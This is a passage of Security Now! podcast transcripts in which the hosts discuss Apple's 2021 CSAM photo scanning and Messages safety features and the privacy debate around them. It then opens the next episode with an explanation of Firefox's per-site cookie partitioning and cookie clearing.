CSAM Detection enables Apple to accurately identify and report iCloud users who store known Child Sexual Abuse Material in their iCloud Photos accounts.  Apple servers flag accounts exceeding a threshold number of images that match a known database of CSAM image hashes so that Apple can provide relevant information to the National Center for Missing and Exploited Children (NCMEC).  And the NCMEC, by the way, is where those original CSAM hashes come from.  So they're provided to Apple.  Apple is then going to be bundling it, binding it into iOS and then performing this neural image hash on every individual user's phone for those images which are going to be synced to iCloud before that happens.  So they've got some very fancy crypto that, if it seems relevant, we'll talk about in the future.  I'm not sure that it matters beyond just the fact of what it does.  So they explain that this process is secure and is expressly designed to preserve user privacy.



CSAM Detection provides the following privacy and security assurances:  Apple does not learn anything about images that do not match any images in the known CSAM database.  Apple cannot access metadata or visual derivatives for matched CSAM images until a threshold of matches is exceeded for an iCloud Photos account.  Meaning that not even one match occurs, but some threshold, so that essentially the heuristic says, okay, this person doesn't have just one matching image, but is apparently a collector of them.



LEO:  And that's to reduce false positives.



STEVE:  Correct.



LEO:  You might have one false positive.  How likely is it that you have more than one?



STEVE:  Right, exactly.  Then they said the risk of the system incorrectly flagging an account is extremely low.  In addition, Apple manually reviews all reports made to NCMEC to ensure reporting accuracy.  So a human is brought into the loop to make sure that, yes, it's not a software error or some weird matching bug.



LEO:  They look at the pictures is what they do.



STEVE:  Yes, yes.  Users cannot access or view the database of known CSAM images.  That is, you don't have the database, you just have hashes.  And users cannot identify which images were flagged as CSAM by the system.



LEO:  Yeah.  Legally, only NCMEC and CMEC can have those images.  They're allowed to.  No one else is.



STEVE:  By law because, I mean, they're illegal.  They're illegal for anyone else to possess them.  Okay.  So the technical details of how Apple pulls this off are very cool.  And the technical details are not at all controversial.  But we'll discuss some of this stuff in a second.  So for the moment we'll just assume that Apple is able to do this and to provide the various blinding guarantees that they claim.  I'm sure they are.  And once I've dug into them, as I said, if there's something there for us to talk about that seems relevant, we'll go there.



Okay.  So that was CSAM Detection.  Now forget all that.  The other completely separate new feature is known as Communication Safety in Messages.  And here's what that is.  Communication Safety in Messages gives parents and children new tools to protect children, or in the case of children themselves, from sending or receiving what an image classifier on the phone believes to be sexually explicit images through any Apple messaging service.  It's a pre- and post-encryption message image filter.  So it operates only on images sent or received over a messaging channel, and only for child accounts set up by their parents in family sharing.  It is opt-in, so it's not on by default.  It needs to be activated and turned on.  Parents have to want this to be done.  Consequently, Anthony Weiner's sexting would not have set off this system, but only because he wasn't a minor at the time whose parents wanted to be informed of this behavior.  



LEO:  However, if he had sent that picture to a minor...



STEVE:  Yes.



LEO:  And their parents had turned this feature on, because parents do get to turn it on and off.



STEVE:  Correct.  Then what's interesting is the minor, as I'll get to in a second, would have been protected by having this image blurred, assuming that it was properly detected, and then given a choice.



Okay.  So the new system performs the image analysis using algorithms on the device itself, nothing sent to Apple, pre- or post-encryption, so it does not change the privacy assurances of Messages.  So says Apple.  The EFF has blown a gasket over this.  We'll get to that in a second.  When a child's account sends or receives an image which sets off the filter because the iOS device detects and believes it to be sexually explicit, the image will be blurred, and the child will be warned that their device believes that the image might be inappropriate.  And the child will be reassured that it's okay if they do not want to view or send the photo.



So the hope is this will dissuade children from sending images that the device believes to be explicit, and it will warn children on the receiving end of such images before they are seen.  And as an additional precaution, younger children of age 12 or below can also, at their parents' behest, be told that, to make sure they are being kept safe, their parents will get a message if they do choose to proceed to view or send the image.  Also, as a side effect of this, that image will be stored in a way that cannot be deleted from their phone.  So that's part of the assurance system if the child chooses to proceed.  Older children of ages 13 through 17, teenagers, will be warned, similar to younger kids, but no parental notification will occur.  That can't even be turned on.



So this entire system, as I said, is only applicable for accounts set up as families in iCloud; and the parent or guardian must opt-in to enable the feature for their family group.  And as I noted above, parental notifications only for 12 and under, not for teenagers.  So that's the system which Apple has announced they are planning to deploy.



LEO:  And I think will deploy, regardless of the amount of heat they get.



STEVE:  Yes, yes.



LEO:  I think it's a done deal, probably.



STEVE:  Yeah.  So of course the EFF, as I said, has blown a gasket, immediately calling this a backdoor.  And I read through their whole rant, and there are points that they make.  There are arguments of this being a slippery slope, that now that Apple has created this facility, you know, the old joke about - I can't tell the old joke, actually.



LEO:  Okay.



STEVE:  We've already established that.  Now we're just negotiating for price.



LEO:  Yes, that joke.  I know the joke, yes.



STEVE:  That joke, yes.  And so the idea being, well, where do you draw the line?  What if some country wants homosexual images to be banned, just because that's what they want.  And so what prevents this filter from being extended to encompass those?



LEO:  And to be fair, Apple has really already opened that Pandora's box by announcing that they could do this, whether they implement it or not.  Now countries know that they could.  They could do it.



STEVE:  Right.  They have said we will, we promise to refuse to do that.



LEO:  Yeah.



STEVE:  And Alex made a very good point about how we get used to things over time.



LEO:  Right.



STEVE:  And right now, this seems like, oh my god, a big change.  But inevitably this will become accepted.  I mean, I remember when we were joking about the name iPad, and we were going to have the MiniPad and the MaxiPad.  And now it doesn't seem, you know, everyone just talks about iPad.



LEO:  Yeah, we're used to it, yeah.  Nobody liked how the AirPods looked, but we're used to it, yeah.



STEVE:  Exactly.



LEO:  Ben Thompson - couple of things.  First of all, Matthew Green, by the way, who we all respect from Johns Hopkins, feels the same way as the EFF does.  And I think Ben Thompson kind of got it right in his Stratechery column about this.  He said it's one thing for iCloud, for any cloud server, in fact almost all cloud providers do this, to say we don't want that imagery on our cloud, so we're going to scan your images as they get uploaded to make sure.  I think that's completely fine.  Google does it, Dropbox, everybody does it.  In fact, they use the same database from NCMEC as Apple's proposing to use.  I don't have a problem with that.  That's well within their rights.  And of course if you do, you just don't use the cloud.



They've crossed a bright line, though, and I understand why people are upset about that, because people kind of, in their mind, pretend that their phone and the data on it is sacrosanct.  And it hoped that  Apple would continue to respect whatever's on their phone and didn't like, and I think rightly so, don't like the idea that Apple is going to be snooping into that.  And that's a big distinction.



STEVE:  And so actually at this moment that means that Apple is the only company not sanitizing their iCloud image storage.



LEO:  That's correct.  And in fact...



STEVE:  Everybody else is.



LEO:  The statistics widely quoted that last year Facebook reported 20 million CSAM images to NCMEC, and Apple reported 265.  And that's the big difference.  And Apple didn't - I think it's safe to say it's not that Apple has fewer problems with this, but just that they decide not to look.



STEVE:  Twenty million, Leo.



LEO:  Yeah.  It's a big - look.  No one denies it's a huge problem and a bad thing.  And I think Apple has every right, in fact I'm glad that they're going to start checking iCloud for that.  I don't want them to check my phone for anything.  I don't want them to provide any facility.  Now, as the guys pointed out on MacBreak Weekly, well, they're already doing it for viruses.  They're doing it for spam.  They already do it if you get mail on iCloud.  They check the attachments in Apple Mail just as Google does with Gmail.



STEVE:  Rene was livid that he can't take a picture of a movie on his iPhone, that the iPhone apparently...



LEO:  Right.  They're already doing some, yeah, copyright materials.  And, yeah, so they're already doing it.  And this extends that.  And that's another fear people have is that, well, how long before the copyright police say, well, let's make sure no copyrighted images are on your phone, either, and that kind of thing.



STEVE:  Well, and Lorrie and I were talking about this last night, and she said, how long do you think it's going to take before 12 year olds start taking pictures of themselves in order to see where the filter threshold is?  I mean, you know that's going to run through elementary school like a storm.



LEO:  Yeah.  To be honest, I'm not really concerned about the actual facts of it.  I'm more upset that they're crossing this line now and doing more on our phones.  You know, I think they've done everything they can to make it private, and I understand.



STEVE:  And I think you made a really good point, too, I think it was you and Alex both, that there may be some really strong behind-the-scenes arm twisting going on...



LEO:  I'm sure there is.



STEVE:  ...from law enforcement over the stance that Apple has uniquely had so far.  I mean, just the fact, Leo, the fact of that statistic of 20 million photos reported on services that look, compared to a couple hundred from a service, Apple's, that doesn't look, I mean, it becomes conspicuous that it isn't looking.



LEO:  Yeah.



STEVE:  And that creates a safe haven, then, for this kind of behavior.



LEO:  Exactly, yeah.



STEVE:  Because people know, oh, I can stick all this filth on iCloud.  No one's looking.



LEO:  Right, yeah.  And there's lots of potential harms for trans kids, and there's, I mean, there's harms that people have talked about that would be...



STEVE:  So are we clear, I'm not, about Apple's access to iCloud content?  Because they make a big deal of, you know...



LEO:  They've always had access to it.  They control the keys.  That's why.



STEVE:  Right.



LEO:  Just like Dropbox.  Just like everybody else.  It's encrypted at rest, but Apple has the keys.  And we know this because, well, law enforcement has access to it, can subpoena it, and has in the past.



STEVE:  Right.  And that was their comment back in San Bernardino, if only the guys hadn't turned the phone off.



LEO:  Precisely, yeah.  It would have backed up to iCloud, and we could have given you all the stuff.



STEVE:  Yup.



LEO:  But you guys screwed it up.  And, you know, you can turn off iCloud photo sharing, which will eliminate this scanning.



STEVE:  Correct.  We should mention that, that if that is turned off, the entire system shuts down.



LEO:  Yeah.  And parents have to enable it for their kids.  I am concerned.  I think some kids, and this is one concern a number of people like Brianna Wu have expressed, that some kids are going to experience transphobic or anti-gay hate from their families because of this tool and won't have any control over it because the parents control that.  And that's, I think, a legitimate cause for concern, as well.  So, yeah, I'm not - I honestly am not happy about it.  But I did poll the MacBreak Weekly team, and none of them have a better solution, and all of them will continue to use iPhones.



STEVE:  Well, it is also the case that it's only the Apple messaging platforms.  So if you were to use Telegram or WhatsApp or any of the...



LEO:  WhatsApp made a point of saying ah ha ha, which I thought was a little disingenuous, but okay.  Anything that's end-to-end encrypted, this shouldn't - well, no, because - no, no, no, because it's doing it on the device before encryption, and in fact that's why it can be done.  It is still end-to-end encrypted.  



STEVE:  Okay.  So Rene mentioned that Apple was considering extending the API to apps that wanted to add that.



LEO:  That's right.



STEVE:  But I thought that suggested that today it's only Apple's messaging, you know, iMessage and text and...



LEO:  That's correct.  That's correct.



STEVE:  Okay, right, right.



LEO:  Although other messaging platforms may well do this.  I don't know.  I'm not saying they don't.



STEVE:  And so do we think that, okay, so obviously, whenever we're talking about the issue of encryption, the government marches out the protect the children/kiddie porn as like their stalking horse for this whole problem.



LEO:  Exactly, yeah.



STEVE:  So is this supposed to defuse that?  I mean, this still doesn't give law enforcement the backdoor into like a larger backdoor.  So that doesn't really solve the problem.  I wonder how much pressure this actually takes off.  On the other hand...



LEO:  That's an interesting question.



STEVE:  Yeah.



LEO:  It may actually be a chink in the armor, and law enforcement to say, ah, good, we're making progress.  Let's keep up that pressure.



STEVE:  And I suppose Apple must see it as a selling point to parents that now this will be a nanny device.



LEO:  Yeah.



STEVE:  Parents can set all this up, turn it on, and...



LEO:  Boy, that bothers me.  That really bothers me.  You know?  And Alex said, look, I'm a parent of the kids this is aimed at, 12 and 13 year olds.  And I don't like the idea.  You know, I think it's a bad idea.



STEVE:  Yeah.  Yeah.  And it does mean that Apple falls from grace, that they were standing absolute on this, and that changes.



LEO:  Actually, in my opinion, this is a good thing because, as we just said, Apple hasn't been fully private for a long time.



STEVE:  Right, right.



LEO:  And they sell this as a marketing tool, but there are all sorts of exceptions to that rule.



STEVE:  Remember the huge...



LEO:  The billboard?



STEVE:  Billboard, yes, in Vegas, that's exactly where I went with that thought.



LEO:  "What's on your iPhone stays on your iPhone" is not the case.  But it never was.  So, yeah, and the fact you can't take a picture of a copyright product or a screenshot of a copyright product, that's very interesting; isn't it.  Anyway, I think this is an eye-opener.  I think you're right, it's a little fall from grace for Apple, which is probably needed.  I'm sure they did it because they felt they had to.  I mean, I'm sure that's why.



STEVE:  Yeah.  And probably not under pressure from parents.



LEO:  No, no.  It's from the government, yeah.



STEVE:  Yeah.  And again, that stat about the number of submissions from people who are looking at cloud storage, that's the canary, in my mind.  It just means that iCloud has become a haven specifically because they're the only people not doing it.



LEO:  That's right.



STEVE:  And that's just icky.



LEO:  Yeah.  So that's good.  And I'm glad they turned that on.  I am.  Yeah, it's a really - it's funny how this has captured the attention of people.  More than just the privacy advocates, the people who listen to this show, but I think the general public.  So I think that's good.  These conversations are important.



STEVE:  Well, yeah.  And I just wanted to talk about the technology and make sure that people understood that, you know, Apple was doing this, I mean, they're going out of their way to do this client-side.  And, you know, I think somebody on MacBreak suggested they just might want to distribute the processing of all the picture processing.  But I think it's some...



LEO:  No, because those hashes are not uploaded.  They're kept  on your device.



STEVE:  Right, right.



LEO:  So there's no benefit to anybody else from it.



STEVE:  Right.  But the idea being all the other non-Apple companies are using their own compute resources, you know, their own cloud-based resources to check for the images, the content of the images.  Whereas Apple is distributing this task out to everyone's iOS device.



LEO:  Right.  But you're only responsible for the images you upload.



STEVE:  Yeah, yeah. 



LEO:  Yeah, I mean, I don't know.  I don't think I'll turn off iCloud photo sharing, or iCloud photo storage.  I think it's a nice tool.



STEVE:  It's handy.  I love that my devices sync that way.



LEO:  And honestly, if you turn it off, and you store your photos somewhere else, chances are the same scanning's happening there. 



STEVE:  Yup. 



LEO:  Good job, Steve.  As always, you can find this show at Steve's website, of course, GRC.com, the 16Kb version unique to his site, the transcripts also unique to his site, 64Kb audio.  While you're there, do check out SpinRite.  We didn't talk about SpinRite today, but everybody knows it's the world's best mass storage maintenance and recovery utility, and 6.0 is soon to make way for 6.1.  If you buy now, you'll get a free upgrade and can participate in the development of 6.1.  There's forums there.  There's lots of other great stuff, too, at GRC.com.



On Twitter he's @SGgrc.  I mention that because his DMs are open.  If you have a comment, a suggestion, you can also message him at the website, GRC.com/feedback.  We have copies of this show, as well, 64Kb audio and video at our website, TWiT.tv/sn.  You can also watch the YouTube channel devoted to Security Now!.  There's also, of course, your favorite podcast client, which absolutely knows about Security Now!.  Is next week our 16th anniversary?



STEVE:  Actually this is the...



LEO:  This is it?



STEVE:  Yes.  This is the last - I'm glad you reminded me.  I meant to mention it.  This is the last episode of Year 16.  Next year, because we cross over the date of the first episode from 2005 in the intervening week.  So we begin Year 17 next week.



LEO:  Isn't that great?  Congratulations, Steve.  I mean, a big thank you for 16 years of this show and all the good you've done and all the learning we've done, thanks to you.  It's hard to imagine 16 years ago that we would be sitting here in 2021 talking about Year 17.



STEVE:  I would not have believed it.



LEO:  You're probably going, what was I thinking?  Oh, my god.



STEVE:  It's the best thing I've ever done for raising awareness of SpinRite.  It was great for that.



LEO:  Well, and also I remember, in fact that's where I first became aware of you, is your great columns in InfoWorld.  I loved them.  Was it InfoWorld?



STEVE:  Yeah, yeah.



LEO:  Loved those.  And in a way this is your weekly column now, in a more modern format.



STEVE:  I have been thinking of it that way, exactly.



LEO:  Yeah, yeah.  This is Steve's weekly chance to address topics of interest to him, usually around security, but not always.  And I love that.  You know, I read your column every week.  I get the honor of sitting here and talking with you every week about the same topics.  So I thank you for that.  The only thing missing is the hand-drawn diagrams.



STEVE:  Well, and I thank our listeners.  I know from hearing from them how much this podcast means to them.



LEO:  Yeah, that's really true.



STEVE:  I'm glad...



LEO:  You've raised a whole generation of security-aware people.  It's really, really great.  I look forward to Year 17 and onward...



STEVE:  Here it comes. 



LEO:  ...Episode 999.  I think, honestly, we're probably both going to retire at 999.  If you want to keep doing it, I'll get Mikah to take over, or Jason or somebody.  But I don't know, I think we both deserve a rest after we get into four digits.  I'm thinking TWiT 1000 might be the last TWiT, as well.  I don't know.  I mean, this is not a preannouncement. 



We do the show every Tuesday, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  So you can watch us do it live.  Thanks to all of you who are watching live right now.  The live streams, audio and video, are at TWiT.tv/live.  Chat with us if you're watching live at irc.twit.tv.  All right.  Business has been taken care of.  I wish I had brought a cake or balloons.  But I can celebrate 16 years with a big fat blow of the vuvuzela.  [Blowing horn]



STEVE:  Woohoo!



LEO:  Happy Anniversary, Steve.  We'll see you next week on Security Now!.



STEVE:  Yay!  Woohoo!



LEO:  Bye-bye.



STEVE:  Bye.	



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#832

DATE:		August 17, 2021

TITLE:		Microsoft's Culpable Negligence

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-832.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at another very significant improvement in Firefox's privacy guarantees and the first steps for Facebook into native end-to-end encryption.  We look at several well-predicted instances of abuse of Microsoft's PrintNightmare vulnerabilities, and at a clever cryptocurrency mining Botnet that optimizes the commandeered system for its own needs.  We note ASUS's terrific move to help their motherboard users make the move to Windows 11, and at the merger of NortonLifeLock and Avast.  Then, after touching upon a bit of errata and some closing-the-loop feedback from our terrific podcast followers, we conclude with a sober consideration of Microsoft's handling of vulnerability patching during the past year.  And we ask what it means.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  He's going to explain why the latest version of Firefox is a must-have for anybody who wants to protect their privacy.  We're going to talk about Magniber and more PrintNightmares.  Also the merger of Avast and NortonLifeLock.  Then Steve is going to rip Microsoft a new one.  He is mad.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 832, recorded Tuesday, August 17th, 2021:  Microsoft's Culpable Negligence.



It's time for Security Now!, the show where we cover your security, your privacy, how computers work, all that, a little science fiction talk thrown in, with Mr. Steve Gibson.  Hello, Steve.



STEVE GIBSON:  Leo, great to be with you again for the launch of Year 17. 



LEO:  Holy cow.  Steve, that's something that really should be remarked upon.  That's amazing.  That's amazing.  17 years.	



STEVE:  I have less hair than I used to.



LEO:  That's incredible.



STEVE:  And you know, if you had any thoughts that maybe Microsoft would ever sponsor this podcast...



LEO:  No, I've given up on that long ago.



STEVE:  It's going to be further away by the time I'm done than  it already was.



LEO:  Somebody said I hate Windows the other day.  And I don't hate Windows.  But I'm also a realist about Windows.  And this show has probably taught me more than any other show that I do.



STEVE:  So what's weird about this one is I didn't start off - I explain this a little bit later.  But this wasn't my intention.  But I was going to do the standard Patch Tuesday Redux, you know, like here's what happened last Tuesday.  But some other news came in Wednesday.  And I just, you know, sometimes you just have to do a reality check.  So this is Security Now! Episode 832 for August 17 titled "Microsoft's Culpable Negligence." 



LEO:  Wow.



STEVE:  And I think I'm - and I'm serious about this.  I think I've made a very strong case for something being different this year, or maybe in the last nine months or so, at least.  Something has happened.  And we're on the inside, those of us who follow this podcast, because we see both sides of what's going on.  The vulnerabilities and the patches and the exploits, and I guess I was going to say all sides of.  But when you put this all together, and look at what's happening, it tells a story which ended up kind of evolving without me intending it to, out of what I was just going to talk about for what happened in August.



But anyway, we're going to have some more fun first.  We have a look at another very significant improvement in Firefox's privacy guarantees.  Also the first steps for Facebook into native end-to-end encryption.  We look at several well-predicted instances of abuse of Microsoft's PrintNightmare vulnerabilities, and then a very clever crypto currency mining botnet that optimizes the commandeered system for its own needs.



We note ASUS's terrific move to help their motherboard users make the move over to Windows 11, and also the merger of NortonLifeLock and Avast.  They are no longer separate entities.  Then, after touching briefly upon a bit of errata and some closing-the-loop feedback from our terrific followers, as I said, we're going to conclude with what turned out to be a sober consideration of Microsoft's handling of vulnerability patching during the past year, and we have to ask what it means.



LEO:  Wow.  Lots to come.  And a Picture of the Week that we know exactly what it means.



STEVE:  This one speaks for itself.



LEO:  Yeah.  Our ever-popular Picture of the Week.



STEVE:  Okay, now, again, well, obviously a Picture of the Week is always going to be a problem for our audio listeners.



LEO:  But you're good at describing these, Steve.



STEVE:  Yeah, well, in this case - okay.  So what we're looking at here is four standard-looking 19" racks, floor to nearly the ceiling.  And prominent, and the reason for the picture, is that someone, some, I think the word maybe is "jamoke," what I'm looking for, has hung some 19" rack gear from one corner, four times.  Like each one of these 19" racks...



LEO:  It's tied up by a zip tie.  These are the switches, I guess, 'cause there's a lot of cables going into them, but they're just hanging there.



STEVE:  And as it would, being hung from a corner, it's not straight up and down, it's off at an angle.  And just, you know, what occurred to me is, okay, so the racks were already full.  



LEO:  Right.



STEVE:  They look like they're full.  But why not set them on top of the rack?



LEO:  Well, this is better for cooling, don't you know.



STEVE:  And I suppose, if you're in a high earthquake environment, they would just swing, like instead of falling off the top of the rack.



LEO:  [Tefman] in IRC says, "It's vertical integration, Steve."  Wow.



STEVE:  Oh, boy.  So, you know, it is sometimes - remember in the beginning of IP, when the first engineers created those, what were they called, those nodes, I can't remember now, the - oh, shoot, it just escapes me.  But they...



LEO:  Oh, yeah, yeah, those little elf nodes, or what were they called?  They had a funny name.



STEVE:  Yeah.  They did have a funny name.  Anyway, they invented the TCP/IP protocol, and like a packet went from San Francisco to L.A.  And it was like, <gasp>.  It works.  Well, looking at this, it's clear we're just taking this for granted now.  



LEO:  Yes.



STEVE:  And frankly, you know, maybe it works.  What happens when one of those things breaks and falls?  I mean, one of the zip ties comes loose.  In fact, over there at the far right one, it looks like there's little black things going up in the air.



LEO:  Oh, what a mess.



STEVE:  It's still being suspended; but, oh, boy.  Anyway...



LEO:  It's also...



STEVE:  IMP, I-M-P.



LEO:  IMPs, that's it.



STEVE:  Interface Message Processor.



LEO:  That's right, yeah.  By the way, there's a timestamp on the photo, 2003.  I bet you those switches are still hanging there, 18 years later.  This is before we even started Security Now!.  This goes way back, way back.



STEVE:  Wow, yeah.  Okay.  So I think it was the week before last that Paul Thurrott mentioned during Windows Weekly that he had done some testing of the latest Firefox, and he was bullish about it.  But I don't recall the details.  And Leo, I confess that I may have missed a more recent change of yours.  But I think that the most recent browser change you've made as a consequence of what Paul learned was back over to Firefox.



LEO:  Yeah.  So the week before he made Vivaldi his Pick of the 



Week, which is a Chromium-based browser.  And I had tried Vivaldi many times.  I really like it.  You would like it because it's got tabs on the side.  I know you like that.



STEVE:  Ooh.



LEO:  Yeah.  You could put tabs wherever you want, but you can have them on the left or on the right.  And so that's nice.  And it's Chromium, so it's fast.  It takes probably a couple hours to set it up initially.  It's got page after page of settings.  Again, something you would like.  So I go through this, spend hours, get it all set up, syncing, it's on all my machines.  Then the very, very next week, Paul says, "But the browser I recommend and I'm using is Firefox."  I was like, oh.  Oh.  The reason he likes it is the UI.  He thinks it's very clean, and he's right.



STEVE:  They really cleaned it up with that change a few iterations ago.



LEO:  Yeah, it's really nice.  And it works.  And we want to support - as you've said many times, a browser monoculture, at least an engine monoculture, is a bad thing. 



STEVE:  Yes.



LEO:  So we want to support them, and they're suffering right now.



STEVE:  So I have some good news.



LEO:  Oh, good.



STEVE:  Okay.  So it's time to catch up on some of the technological changes that Firefox has been making.  Because, and this they announced on last Tuesday, so everybody should have it by now, those of us who are still using Firefox - and Leo, I'm glad to know that you're still among the well-washed masses.  Last week's announcement is firmly based upon and is an extension of a very significant earlier architectural move that Mozilla made.  So I want to first review that innovation upon which last week's announcement was based.  And this was back from Firefox 86.  And you can remember that number easily because they 86'd cookie tracking with really what was a breakthrough release for Firefox.



Now, unfortunately, Mozilla chose the name Total Cookie Protection, which leaves me a bit cool, since what's that supposed to mean?  I mean, at least it's apparently total, whatever it is, so that's good.  It's better than if they named it Somewhat Better Cookie Protection.  But that still doesn't tell us what cookie protection actually means.



LEO:  72% cookie protection.



STEVE:  Your cookies are going to be protected?  Is that good?



LEO:  Yeah, what does it mean?  Yeah.



STEVE:  I'm not sure.  I want to delete them.  I don't want them to be protected.  So brainstorming a bit, a couple ideas came to mind.  So I thought, how about if they called it the Total Tracking Terminator?



LEO:  I like that, TTT, I like that.



STEVE:  Wouldn't you rather have - would you rather have Total Cookie Protection or the Tracking Terminator on your side?  So even though Firefox's new Total Tracking Terminator has been weakly named Total Cookie Protection, it really does the job.



LEO:  That's good enough.  That's good.



STEVE:  Yes, well, and I'll explain why in a second.  It would be wonderful, frankly, to see this added into the Chromium core so that all those other non-Google users of the Chromium browser engine, and most of them are, I mean, these alternative browsers are, like, featuring privacy and protection and keeping you safe; right?  That's their hook.  So it would be great if they could duplicate Mozilla's perfect solution.



Okay.  So just to remind our listeners, from February, how does the Tracking Terminator, unfortunately not named that, work?  Okay.  The best ideas are clean and simple, easy to explain, easy to implement.  This is that.  Whether cookies are first-party, received directly from the site being visited, or third-party cookies received from any and all other domains whose assets the first-party site has invoked or caused to be invoked, all Firefox does, starting with release 86, when it is set in its strict mode, is to store every cookie received from any domain while visiting a website inside that website's own private what they call "cookie jar."  That's all.  That's it.  That's all that's required for Firefox to effectively terminate all cookie-based tracking.



Third-party cookies still work.  They just don't work when you go somewhere else because the third-party cookie you got when you were visiting Site A is unknown to Site B.  You may get it again, a third-party cookie for Site B, but Site B doesn't return the third-party cookie you got from Site A.  That's the way third-party cookies have always worked.  It's always been a problem.  And Firefox just killed it.  They terminated it by creating essentially stovepiping for the things that your browser gets when it's visiting a site.  And I would argue that this is a mistake that every previous browser has made by treating cookies like a global resource which are inherently all shared in a single massive communal cookie jar.  And therefore they're accessible from any website.



And this is what this global cookie jar that allowed the same cookie, which may have been planted by one advertising provider, to be used to track the user from website to website as they moved across the Internet.  There's always only been a single browser-wide and thus Internet-wide communal cookie jar.  But the instant we have individual per-site cookie jars, all that tracking disappears, and you could say that, as I have, tracking is terminated.



Okay.  So I'll just repeat that it would be utterly wonderful to see this added into Chromium so that all those non-Google users of the Chromium browser engine - Brave, Edge, Opera, Silk, Vivaldi, and others - could also terminate tracking at the user's choice.  I don't think this could be done with an add-on.  It probably needs to be implemented pretty deep in the browser's core.  But maybe, hopefully, this notion will catch on. 



Okay.  With that understanding, what happened last Tuesday?  The Mozilla security blog posted an update on the privacy-enhancing changes they're continuing to make in Firefox.  And now, sadly, they once again gave this new feature the rather milquetoast-y name Enhanced Cookie Clearing.  Really?  They desperately need someone to snazz up their naming department over there are Mozilla.  Instead of the yawn-inducing Enhanced Cookie Clearing name, I was thinking of something more along the lines of Website Historyectomy.



LEO:  Oh, no, no, no.  No, no, no.



STEVE:  With Firefox 91.



LEO:  No, please.



STEVE:  Just press the Website Historyectomy button, and Firefox immediately completely and utterly forgets everything, and I mean everything it ever knew about that - now, Leo, come on.  You're never going to forget that name.



LEO:  No, I remember it now.



STEVE:  Yeah, yeah.  Uh-huh, yeah.



LEO:  So what does it do?



STEVE:  Okay.  So Mozilla explains it this way and provides some additional detail:  "We're pleased to announce a new, major privacy enhancement to Firefox's cookie handling that lets you fully erase your browser history for any website.  Today's new version of Firefox Strict Mode" - and that is of last Tuesday you can get it now, Firefox 91 - "lets you easily delete all cookies and supercookies that were stored on your computer by a website or by any trackers embedded in it.



"Building on the poorly named Total Cookie Protection, what we know now as the Tracking Terminator, Firefox 91's new approach, apparently not to be called Website Historyectomy, to deleting cookies prevents hidden privacy violations and makes it easy for you to see which websites are storing information on your computer.



"When you decide to tell Firefox to forget about a website, Firefox will automatically throw away all cookies, supercookies, and other data stored in that website's cookie jar," which they're still insisting on calling it.  "This Enhanced Cookie Clearing makes it easy to delete all traces of a website in your browser without the possibility of sneaky third-party cookies sticking around.



"Browsing the web leaves data behind in your browser.  A site may set cookies to keep you logged in, or store preferences in your browser.  There are also less obvious kinds of site data such as caches that improve performance, or offline data, which allows web applications to work without an Internet connection.  Firefox itself also stores data safely on your computer about sites you have visited, including your browser history or site-specific settings and permissions."  In other words, there's a whole bunch of stuff, right, besides cookies.



I'm going to skip some more of this stuff that we already understand about third-party cookies and how they work and so forth.  They wrap up:  "Embedded third-party resources complicate data clearing.  Before Enhanced Cookie Clearing, Firefox cleared data only for the domain that was specified by the user.  That meant that if you were to clear" - and they have some examples here about clearing cookies for a specific domain.  They would only be cleared for that domain.



They said:  "Total Cookie Protection, built into Firefox, makes sure that Facebook.com can't use cookies to track you across websites.  It does this by partitioning data storage into one cookie jar per website, rather than using one big jar for all of Facebook.com's storage.  With Enhanced Cookie Clearing" - last week - "if you clear site data, the entire cookie jar is emptied for that site, including any Facebook.com data set while embedded in that site."



Okay.  So the way to visualize this is that Firefox 91 reorganizes the data that the browser retains.  It was originally organized by the domain that owned and produced the data.  Now it's organized and also stored by the site you were visiting when the browser received that data.  That's a huge difference.  What they've done with 91 is extend this stovepiping isolation model beyond just a site's cookie storage.  They're now sequestering all history, all data, and all changes that visiting a website can make or cause to be made into a single "Cookies & Site Data" repository, which Firefox's user can delete with the push of a button.



Once this sort of first-party domain-based containment has been provided  and as I said, I hope that this is the future of web browsing architecture because it's the correct architecture  the only remaining trackable signals being sent by browsers are its static query headers.  We've talked about finger-printing based on query headers because they contain version information about add-ons and things - and those of course are in the process of being deliberately blurred now - and also things that can be extracted by JavaScript, like high-resolution battery charge level, current device illumination, GPS location, gyroscope orientation, available storage space and so on.  We've covered all those things over the years.



And they are things that JavaScript will send back to a tracker in order to get additional bits of soft identity in order to try to hold onto you.  And as we've discussed previously, the resolution provided to JavaScript for each of those real-world physical attributes has been deliberately reduced to blur and increase the entropy of any returned data.  I believe that JavaScript should be entirely blinded to all of that without receiving its users' explicit permission.  It is not today.  You don't see JavaScript having to ask.  All of that was only added by techies because they thought it was cool, but not because it serves any clear purpose.



And think about it.  How would we feel if advertisements running JavaScript could listen to our microphone or peer out of our camera whenever they felt like it, without our permission?  These other parameters are not any really less of a privacy violation.  Yeah, it's way lower bandwidth, and it's less directly identifying.  But it's of a similar ilk.



So as regards cross-Internet tracking, the handwriting does seem to be on the wall.  Users don't like the idea of being tracked.  Many may not really care about it that much.  But we've seen what the response was to Apple's requiring apps to explicitly request and receive permission to track their users.  Nearly everyone said no.  If you do it without me knowing, fine.  But if you're going to ask me if I actually want to be tracked, then hell no.  Are you nuts?  And Google appears to be aware that their days of secretly tracking are numbered, too.



So props to Firefox for this change.  Essentially what this means is they've sort of picked up on some of the lessons of their incognito mode.  That is, you can, without having to go into incognito mode if you want, you can go to a site, muck around there, and then with a push of a button completely remove all previous knowledge from Firefox of your visit to that site.  All cookies, all data, you're out of the browser history, no breadcrumbs, no cookie crumbs, nothing is left behind.



So again, all they had to do, the thing I love about this, is that they just switched the store, the global information store, from being global, where it's accessed by domain, they switched it into individual stores by the domain you're visiting, which may contain data from other domains.  Those are third parties.  But they're all there.  And the cool thing is, when you are somewhere else, your browser has no access to that stovepiped information which belongs, logically belongs to the domain you were visiting when you received it.  It shouldn't be available when you're somewhere else.  That's tracking.  And that's the way it's always been done.  Firefox fixed it.  So yay.



